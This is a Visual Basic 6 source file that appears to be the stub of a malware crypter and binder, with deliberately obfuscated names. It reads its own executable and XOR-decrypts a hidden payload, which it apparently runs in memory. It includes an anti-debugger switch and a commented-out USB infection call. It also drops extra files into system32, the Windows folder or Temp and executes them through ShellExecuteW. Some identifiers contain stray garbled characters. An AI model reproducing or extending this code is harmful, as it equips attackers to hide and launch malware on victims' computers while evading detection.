Attribute VB_Name = "BmrhcSKwQ"
Sub Main()
If App.PrevInstance = True Then End

hr29rh
'GGSS
'MsgBox h38h

End Sub

Function hr29rh()
Dim Qwl06Svf‹ As New IJWFBVnZ

Qwl06Svf‹.DAZHAUDL‹P StrConv(h97t4, vbFromUnicode)
End Function
Function h38h() As String
  Dim Qwl06Svf‹ As New IJWFBVnZ
  Dim O2IYChN As Long
  Dim JdE As Long
  Dim ZuoLXHQ(512) As Byte
  Dim RsWuHFz0E As String
  
  O2IYChN = Qwl06Svf‹.LoadLibrary("kernel32")
  JdE = Qwl06Svf‹.CZWC‹BFDRV(O2IYChN, "GetModuleFileNameW")
  Qwl06Svf‹.OEQVIZJWFK JdE, 0&, VarPtr(ZuoLXHQ(0)), 512
  RsWuHFz0E = Left$(ZuoLXHQ, InStr(ZuoLXHQ, Chr$(0)) - 1)
  
  h38h = RsWuHFz0E
End Function

Public Function h97t4() As String
Const StrSplDat = "EH2GNF454DKU116V8A3M7HXJANMCSH1GQNHVN57LL623J"
Dim KKK As String
Dim FF As Integer

FF = FreeFile

Open h38h For Binary Access Read As #FF
 h97t4 = Space(LOF(FF))
 Get #1, , h97t4
Close #1

KKK = Split(h97t4, StrSplDat)(1)
h97t4 = Split(h97t4, StrSplDat)(2)
h97t4 = XORDecryption(KKK, h97t4)
End Function

Function GGSS()
Const StrSplSet = "N6HM25G764LT7BL426JHRG1N8W87MS87U3T138R2PNPLW"
Dim SSDD As String
Dim FF As Integer

FF = FreeFile
Open h38h For Binary Access Read As #FF
 SSDD = Space(LOF(FF))
 Get #1, , SSDD
Close #1

Select Case Split(SSDD, StrSplSet)(1)
    Case 1
        WRS
End Select
Select Case Split(SSDD, StrSplSet)(2)
    Case 1
        AntiDebugger
End Select
Select Case Split(SSDD, StrSplSet)(3)
    Case 1
        'InfectUSB "system.exe", True
End Select
Select Case Split(SSDD, StrSplSet)(4)
    Case 1
        BBBB
End Select
End Function

Function BBBB()
Const StrSplBin = "XKJ5DS31VJT673136SVE634487JKQFG4RVLQGS48V4MQJ"
Const StrSplSet = "N6HM25G764LT7BL426JHRG1N8W87MS87U3T138R2PNPLW"
Dim KKK As New IJWFBVnZ
Dim KK1 As Long
Dim KK2 As Long
Dim SSDD As String
Dim StrBP As String
Dim StrBData As String
Dim StrBName As String
Dim FF As Integer
Dim i As Integer

FF = FreeFile
Open h38h For Binary Access Read As #FF
 SSDD = Space(LOF(FF))
 Get #1, , SSDD
Close #1

KK1 = KKK.LoadLibrary("shell32")
KK2 = KKK.CZWC‹BFDRV(KK1, "ShellExecuteW")

For i = 1 To UBound(Split(SSDD, StrSplBin)) - 1
    Select Case Split(Split(SSDD, StrSplBin)(i), StrSplSet)(2)
        Case 1
            StrBP = Environ$("WinDir") & "\system32\"
        Case 2
            StrBP = Environ$("WinDir") & "\"
        Case 3
            StrBP = Environ$("Temp") & "\"
    End Select

    StrBName = StrBP + Split(Split(SSDD, StrSplBin)(i), StrSplSet)(1)
    StrBData = Split(Split(SSDD, StrSplBin)(i), StrSplSet)(0)
    StrBData = XORDecryption("ule", StrBData)
    Open StrBName For Binary As #FF
        Put #FF, , StrBData
    Close #FF
    Select Case Split(Split(SSDD, StrSplBin)(i), StrSplSet)(3)
        Case 1
            KKK.OEQVIZJWFK KK2, 0, 0, StrPtr(StrBP + Split(Split(SSDD, StrSplBin)(i), StrSplSet)(1)), 0, 0, 0
    End Select
Next i
End Function

